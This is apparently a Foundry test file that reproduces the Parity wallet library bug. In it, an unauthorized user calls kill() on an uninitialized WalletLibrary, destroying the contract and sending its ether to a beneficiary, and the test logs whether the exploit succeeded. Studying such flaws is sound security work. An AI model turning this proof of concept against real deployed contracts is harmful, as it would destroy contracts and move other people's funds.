// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/parity_wallet_bug_1.sol";

contract WalletLibraryKillTest is Test {
    WalletLibrary public walletLibrary;
    address unauthorizedUser = makeAddr("unauthorizedUser");
    address beneficiary = makeAddr("beneficiary");

    function setUp() public {
        // Deploy uninitialized WalletLibrary (vulnerable state)
        walletLibrary = new WalletLibrary();
    }

    function testAnyoneCanKillWalletLibrary() public {
        // Fund vulnerable contract to observe balance transfer effect
        uint256 amount = 1 ether;
        vm.deal(address(walletLibrary), amount);
        
        console2.log("--- BEFORE-Trigger Balances ---");
        uint256 initialContractBalance = address(walletLibrary).balance;
        uint256 initialBeneficiaryBalance = beneficiary.balance;
        console2.log("WalletLibrary ETH balance:", initialContractBalance);
        console2.log("Beneficiary initial ETH balance:", initialBeneficiaryBalance);

        console2.log("--- Trigger: execute kill() from unauthorized user ---");
        vm.prank(unauthorizedUser);
        walletLibrary.kill(beneficiary);

        console2.log("--- AFTER-Trigger Balances ---");
        uint256 finalContractBalance = address(walletLibrary).balance;
        uint256 finalBeneficiaryBalance = beneficiary.balance;
        console2.log("WalletLibrary ETH balance after kill:", finalContractBalance);
        console2.log("Beneficiary ETH balance after kill:", finalBeneficiaryBalance);

        bool contractDestroyed = finalContractBalance == 0;
        bool fundsTransferred = finalBeneficiaryBalance == initialBeneficiaryBalance + amount;
        bool exploitSuccessful = contractDestroyed && fundsTransferred;
        
        console2.log("Check if contract ETH balance destroyed:", contractDestroyed ? "YES" : "NO");
        console2.log("Check if ETH transferred to beneficiary:", fundsTransferred ? "YES" : "NO");

        if (exploitSuccessful) {
            console2.log("Vulnerability Exists: Unauthorized user successfully destroyed contract and transferred funds");
        } else {
            console2.log("Vulnerability not Exist: Kill operation did not execute as expected");
        }
    }
}